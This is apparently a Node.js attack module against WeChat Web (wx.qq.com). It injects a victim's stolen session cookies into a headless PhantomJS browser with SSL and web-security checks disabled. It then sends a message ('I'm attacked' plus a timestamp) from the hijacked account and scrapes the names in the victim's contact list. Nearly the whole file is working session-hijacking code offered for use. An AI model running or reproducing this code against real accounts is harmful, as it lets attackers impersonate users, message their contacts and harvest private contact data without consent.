var debug = require('debug')('wx.qq.com');
var cookie = require('cookie');
var request = require('request');
var phridge = require('phridge');


request.debug = false;

function run(data) {
  var cookies = cookie.parse(data.cookies);

  phridge
      .spawn({
        diskCacheEnabled: true,
        ignoreSslErrors: true,
        autoLoadImages: false,
        webSecurityEnabled: false
      })
      .then(function (phantom) {

        phantom.run(cookies, function (cookies, resolve) {

          var page = webpage.create();

          for (var key in cookies) {
            phantom.addCookie({
              name: key,
              value: cookies[key],
              path: '/',
              domain: '.qq.com',
              httponly: false,
              secure: false,
              expires: 'Infinity'
            });
          }

          page.onCallBack = function(data) {
            console.log('onCallBack:', data);
            //console.log('CALLBACK: ' + JSON.stringify(data));
            //resolve(data);
          }

          page.onConsoleMessage = function(msg, lineNum, sourceId) {
            console.log('CONSOLE: ' + msg);
          };

          page.onResourceRequested = function(requestData, networkRequest) {
            //console.log('Request (#' + requestData.id + '): ' + JSON.stringify(requestData));
          };

          page.open('https://wx.qq.com/', function (status) {
            console.log('STATUS: ' + status);
            page.includeJs("https://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js", function() {
              page.evaluateAsync(function() {

                function clickElement (el){
                  var ev = document.createEvent("MouseEvent");
                  ev.initMouseEvent(
                      "click",
                      true /* bubble */, true /* cancelable */,
                      window, null,
                      0, 0, 0, 0, /* coordinates */
                      false, false, false, false, /* modifier keys */
                      0 /*left*/, null
                  );
                  el.dispatchEvent(ev);
                };

                $(function() {
                  var msg = 'I\'m attacked ' + (new Date).getTime();
                  clickElement($('#conversationContainer .chatListColumn:first')[0]);
                  document.getElementById('textInput').value = msg;
                  clickElement($('.chatSend')[0]);

                  clickElement($('.addrButton')[0]);
                  setTimeout(function() {
                    var contacts = $('#contactListContainer .nickName').map(function() {
                      return $(this).text();
                    }).get();
                    console.log('contacts: ' + JSON.stringify(contacts));
                  }, 5000);

                  //window.callPhantom({msg: 'aaaaa'});
                  resolve({
                    msg: msg,
                    contacts: contacts
                  });
                });

              });

            });

          });
        })
        .then(function (obj) {
          debug('obj: ', obj);
          phantom.dispose();
        });
      })
      .catch(function (err) {
        console.log(err); // 'An unknown error occured'
      });

}

exports.run = run;